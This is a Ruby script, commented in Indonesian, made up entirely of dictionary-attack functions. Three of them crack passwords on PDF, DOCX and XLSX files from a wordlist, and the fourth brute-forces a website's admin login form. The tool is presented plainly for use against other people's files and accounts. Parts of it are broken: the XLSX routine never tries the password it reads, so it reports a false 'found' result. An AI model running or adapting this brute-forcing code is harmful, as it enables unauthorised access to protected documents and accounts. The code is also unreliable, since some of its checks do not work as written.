require 'pdf-reader'
require 'docx'
require 'rubyzip'
require 'mechanize'

# Fungsi untuk memecahkan password pdf
def crack_pdf(file_path, dictionary_file)
    puts "Mencoba memecahkan pdf bro: #{file_path}"
    File.open(dictionary_file, 'r') do |file|
        file.each_line do |line|
            password = line.strip
            begin
                reader = PDF::Reader.new(file_path, password: password)
                puts "Password ditemukan untuk PDF: #{password}"
                return password
            rescue PDF::Reader::EncryptedPDFError
                next
            end
        end
    end
    puts "Password tidak ditemukan"
    nil 
end

# Fungsi untuk memecahkan password docx
def crack_docx(file_path, dictionary_file)
    puts "Mencoba memecahkan docx: #{file_path}"
    File.open(dictionary_file, 'r') do |file|
        file.each_line do |line|
            password = line.strip
            begin
                doc = Docx::Document.open(file_path, password: password)
                puts "Password ditemukan untuk docx: #{password}"
                return password
            rescue => e
                next
            end
        end
    end
    puts "Password tidak ditemukan"
    nil
end

# Fungsi untuk memecahkan password xlsx
def crack_xlsx(file_path, dictionary_file)
    puts "Mencoba memecahkan xlsx: #{file_path}"
    File.open(dictionary_file, 'r') do |file|
        file.each_line do |line|
            password = line.strip
            begin
                Zip::File.open(file_path) do |zip_file|
                    zip_file.each do |entry|
                        # Mencoba password di file zip
                        entry.get_input_stream.reader
                    end   
                end
                puts "Password ditemukan untuk xlsx: #{password}"
                return password
            rescue
                next
            end
        end
    end
    puts "Password tidak ditemukan"
    nil
end

# Fungsi untuk memecahkan halaman admin
def brute_force_login(url, dictionary_file, login_form)
    agent = Mechanize.new
    puts "Mencoba memecahkan password"

    File.open(dictionary_file, 'r') do |file|
        file.each_line do |line|
            password = line.strip
            begin
                form = agent.get(url).form_with(action: login_form[:action])
                form[login_form[:username_field]] = login_form[:username]
                form[login_form[:password_field]] = password
                page = agent.submit(form)

                # JIka berhasil login
                if page.uri.to_s.include?("dashboard")
                    puts "Password ditemukan untuk login: #{password}"
                    return password
                end
            rescue 
                next
            end
        end
    end
    puts "Password tidak ditemukan"
    nil
end
            


            